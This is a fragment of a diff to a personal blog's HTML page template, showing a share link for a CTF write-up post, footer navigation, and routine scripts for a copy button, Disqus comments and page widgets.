+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&name=ZJGSCTF-writeup&description=&lt;p&gt;——&lt;a href=&#34;http://121.42.189.18&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ZJGSCTF&lt;/a&gt;——-&lt;br&gt;——持续更新中——-&lt;br&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
+    </div>
 
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
 
-
-<div class="scroll" id="scroll">
-    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
-</div>
-<script>
-    // Open in New Window
-    
-        var oOpenInNew = {
-            
-            
-             post: ".article-entry a[href], .copyright a[href]", 
-            
-            
-            
-             archives: ".archive-article-title", 
-             miniArchives: "a.post-list-link", 
-            
-             friends: "#js-friends a", 
-             socail: ".social a" 
-        }
-        for (var x in oOpenInNew) {
-            $(oOpenInNew[x]).attr("target", "_blank");
-        }
-    
-</script>
-
-    <script>
-        var originTitle = document.title;
-        var titleTime;
-        document.addEventListener("visibilitychange", function() {
-            if (document.hidden) {
-                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
-                clearTimeout(titleTime);
-            }
-            else {
-                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
-                titleTime = setTimeout(function() {
-                    document.title = originTitle;
-                }, 2000);
-            }
-        })
-    </script>
-
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
   </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 LaLa
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'lalajun';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
 </body>
 </html>
